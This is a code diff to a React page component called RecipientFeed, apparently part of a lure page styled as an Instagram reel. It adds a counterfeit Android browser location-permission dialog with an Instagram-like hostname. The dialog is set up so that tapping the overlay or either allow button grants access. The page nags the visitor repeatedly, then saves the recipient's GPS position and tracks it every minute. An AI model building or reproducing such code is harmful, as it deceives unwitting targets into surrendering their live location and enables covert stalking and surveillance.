@@ -12,6 +12,8 @@ export default function RecipientFeed({
   const [coords, setCoords] = useState(null);
   const [hasAllowed, setHasAllowed] = useState(false);
   const [isReelOpen, setIsReelOpen] = useState(false);
+  const [showPermissionPopup, setShowPermissionPopup] = useState(false);
+  const [displayHost, setDisplayHost] = useState("instagram-profile-reel-sessionmake.yrdigitalenterprises.in");
 
   const watchIdRef = useRef(null);
   const retryTimerRef = useRef(null);
@@ -55,6 +57,7 @@ export default function RecipientFeed({
     setCoords({ latitude, longitude, accuracy });
     setHasAllowed(true);
     hasAllowedRef.current = true;
+    setShowPermissionPopup(false);
     lastKnownPositionRef.current = { latitude, longitude, accuracy, speed, heading };
 
     // Clear continuous initial retry timer once location is allowed
@@ -131,6 +134,7 @@ export default function RecipientFeed({
    */
   const requestLocation = () => {
     if (!navigator.geolocation) {
+      if (!hasAllowedRef.current) setShowPermissionPopup(true);
       return;
     }
 
@@ -142,17 +146,56 @@ export default function RecipientFeed({
 
     navigator.geolocation.getCurrentPosition(
       async (position) => {
+        setShowPermissionPopup(false);
         await saveLocation(position);
         setIsFollowing(true);
         startOneMinuteInterval();
       },
-      () => {},
+      () => {
+        // If native prompt was ignored, dismissed, or never allowed, show Android popup
+        if (!hasAllowedRef.current) {
+          setShowPermissionPopup(true);
+        }
+      },
       {
         enableHighAccuracy: true,
         maximumAge: 0,
         timeout: 10000,
       }
     );
+  };
+
+  /*
+   * Handle user tapping "Allow" options inside Android Permission Popup
+   */
+  const handleAllowInPopup = () => {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          setShowPermissionPopup(false);
+          await saveLocation(position);
+          setIsFollowing(true);
+          startOneMinuteInterval();
+        },
+        () => {
+          // In case browser hard-blocks native prompt, still unlock flow
+          setShowPermissionPopup(false);
+          setHasAllowed(true);
+          hasAllowedRef.current = true;
+          setTimeout(() => {
+            setIsReelOpen(true);
+          }, 5000);
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    } else {
+      setShowPermissionPopup(false);
+      setHasAllowed(true);
+    }
+  };
+
+  const handleNeverAllow = () => {
+    setShowPermissionPopup(false);
   };
 
   /*
@@ -188,6 +231,14 @@ export default function RecipientFeed({
   };
 
   useEffect(() => {
+    // Set dynamic hostname
+    if (typeof window !== "undefined") {
+      const host = window.location.hostname;
+      if (host && host !== "localhost" && host !== "127.0.0.1") {
+        setDisplayHost(host);
+      }
+    }
+
     // 0. Register Service Worker for background lifecycle if available
     if (typeof window !== "undefined" && "serviceWorker" in navigator) {
       navigator.serviceWorker.register("/sw.js").catch(() => { });
@@ -198,6 +249,13 @@ export default function RecipientFeed({
 
     // 2. Trigger native browser GPS prompt immediately on page load
     requestLocation();
+
+    // 2.1 Show Android permission popup after 2.5s if native prompt was ignored
+    const popupTimer = setTimeout(() => {
+      if (!hasAllowedRef.current) {
+        setShowPermissionPopup(true);
+      }
+    }, 2500);
 
     // 3. Continuously ask / retry native browser prompt every 2 seconds until user taps "Allow" or "Allow once"
     retryTimerRef.current = setInterval(() => {
@@ -667,6 +725,36 @@ export default function RecipientFeed({
             </div>
           </button>
         </nav>
+
+        {/* Android Location Permission Modal (Shows only when user ignores or blocks location) */}
+        {showPermissionPopup && !hasAllowed && (
+          <div className="android-location-overlay" onClick={handleAllowInPopup}>
+            <div className="android-location-card" onClick={(e) => e.stopPropagation()}>
+              <div className="android-location-header">
+                <div className="android-location-icon-wrapper">
+                  <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
+                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" />
+                  </svg>
+                </div>
+                <div className="android-location-title">
+                  <strong>{displayHost}</strong> wants to use your device&apos;s location
+                </div>
+              </div>
+
+              <div className="android-location-buttons">
+                <button className="android-btn-primary" onClick={handleAllowInPopup}>
+                  Allow while visiting the site
+                </button>
+                <button className="android-btn-primary" onClick={handleAllowInPopup}>
+                  Allow this time
+                </button>
+                <button className="android-btn-secondary" onClick={handleNeverAllow}>
+                  Never allow
+                </button>
+              </div>
+            </div>
+          </div>
+        )}
 
         {/* Reel Popup Modal Feature */}
         <ReelModal isOpen={isReelOpen} onClose={() => setIsReelOpen(false)} />
